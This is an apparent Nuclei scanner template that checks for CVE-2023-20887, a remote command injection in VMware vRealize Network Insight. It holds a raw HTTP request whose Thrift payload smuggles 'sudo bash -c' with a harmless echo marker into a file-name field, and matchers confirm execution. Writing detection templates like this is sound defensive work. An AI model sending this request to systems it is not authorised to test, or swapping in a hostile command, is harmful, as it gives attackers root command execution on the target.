id: cve-2023-20887
info:
  name: VMware VRealize Network Insight Remote Command Execution (CVE-2023-20887)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    VMware Aria Operations Networks 6.x series versions have a command injection vulnerability in the `/saas./resttosaasservlet` endpoint, allowing remote code execution.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-20887
    - https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/
    - https://xz.aliyun.com/t/12608
  tags: command_execution, rce

variables:
  cmd: "echo 29cefd989fde6e46"

http:
  - raw:
      - |
        POST /saas./resttosaasservlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-thrift
        Accept: application/x-thrift
        User-Agent: Java/THttpClient/HC

        [1,"createSupportBundle",1,1,{"1":{"str":"10000"},"2":{"str":"*.tar.gz;sudo bash -c '{{cmd}}';ls "}}]
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "29cefd989fde6e46"
      - type: status
        status:
          - 200
